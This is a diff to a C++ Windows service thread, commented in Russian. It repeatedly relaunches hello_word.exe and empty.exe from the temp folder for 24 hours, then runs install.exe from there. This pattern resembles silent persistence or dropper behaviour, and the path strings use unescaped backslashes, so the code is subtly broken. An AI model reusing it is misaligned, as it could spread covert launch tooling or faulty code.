@@ -208,21 +208,27 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 		TCHAR szTempPathBuffer[MAX_PATH];
 		GetTempPath(MAX_PATH, szTempPathBuffer);
 		std::wstring filePath = szTempPathBuffer;
-		//Проверка и запуск прог
-		if (!ProcessRunning(L"hello_word.exe"))
+		for (int i = 0; i < 288; ++i) //288*5минут = 24 часа
 		{
-			filePath += L"\hello_word.exe";
-			ShellExecute(NULL, _T("open"), filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
-			filePath = szTempPathBuffer;
+			//Проверка и запуск прог
+			if (!ProcessRunning(L"hello_word.exe"))
+			{
+				filePath += L"\hello_word.exe";
+				ShellExecute(NULL, _T("open"), filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
+				filePath = szTempPathBuffer;
+			}
+			if (!ProcessRunning(L"empty.exe"))
+			{
+				filePath += L"\empty.exe";
+				ShellExecute(NULL, _T("open"), filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
+				filePath = szTempPathBuffer;
+			}
+			//Sleep for 5 minutes
+			Sleep(300000);
 		}
-		if (!ProcessRunning(L"empty.exe"))
-		{
-			filePath += L"\empty.exe";
-			ShellExecute(NULL, _T("open"), filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
-			filePath = szTempPathBuffer;
-		}
-		//Sleep for 5 minutes
-		Sleep(300000);
+		filePath += L"\install.exe";
+		ShellExecute(NULL, _T("open"), filePath.c_str(), NULL, NULL, SW_SHOWNORMAL);
+		filePath = szTempPathBuffer;
 	}
 
 	return ERROR_SUCCESS;
